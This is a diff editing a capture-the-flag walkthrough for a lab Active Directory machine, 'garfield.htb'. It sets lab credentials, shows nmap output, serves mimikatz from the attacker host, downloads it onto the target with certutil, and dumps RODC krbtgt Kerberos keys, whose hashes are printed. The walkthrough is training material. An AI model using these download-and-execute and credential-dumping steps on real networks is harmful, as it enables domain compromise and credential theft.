@@ -74,45 +74,38 @@ j.arbuckle
 ```bash
 export TARGET_IP="10.129.20.167"
 export ATTACKER_IP="10.10.14.241"
-export USER="j.arbuckle"
-export PASS="Th1sD4mnC4t!@1978"
 export DOMAIN="garfield.htb"
+export USER="j.arbuckle"
+export PASS='Th1sD4mnC4t!@1978'
+echo "$TARGET_IP DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
 ```
 
-## 1.2 Nmap Scan
+## 1.2 Scan the Host
 
 ```bash
-nmap -sV -sC -p- $TARGET_IP -oN garfield.nmap
+nmap -sC -sV $TARGET_IP
 ```
 
-### Key Ports
+### Output
 
 ```text
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-06 07:03:06Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info:
-|   Target_Name: GARFIELD
-|   NetBIOS_Domain_Name: GARFIELD
-|   NetBIOS_Computer_Name: DC01
-|   DNS_Domain_Name: garfield.htb
-|   DNS_Computer_Name: DC01.garfield.htb
-|   Product_Version: 10.0.17763
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+
+clock-skew: +8h
 ```
 
 ### Notes
@@ -507,36 +500,38 @@ nt authority\system
 ## 13.1 Serve Mimikatz from Kali
 
 ```bash
-cd /home/user
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
+cd /tmp
 python3 -m http.server 8888
 ```
 
-## 13.2 Transfer and Run in SYSTEM Shell
+## 13.2 Download Mimikatz on RODC01
 
-```powershell
+```cmd
+cd C:\Windows\Temp
 certutil -urlcache -split -f http://10.10.14.241:8888/mimikatz.exe mimikatz.exe
-.\mimikatz.exe
+mimikatz.exe
 ```
 
-## 13.3 Dump RODC Kerberos Keys
+Inside mimikatz:
 
 ```text
-mimikatz # lsadump::secrets
-...
+privilege::debug
+lsadump::lsa /inject /name:krbtgt_8245
 ```
 
 ### Output
 
 ```text
-Domain : GARFIELD
-SID    : S-1-5-21-2502726253-3859040611-225969357
+Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
 
-  RODC number              : 8245
+RID  : 00000643 (1603)
+User : krbtgt_8245
 
-  Old Kerberos keys :
-    ...
-  Current Kerberos keys :
-    ...
+ * Kerberos-Newer-Keys
+    Default Salt : GARFIELD.HTBkrbtgt_8245
+    Default Iterations : 4096
+    Credentials
       aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
       aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
 ```
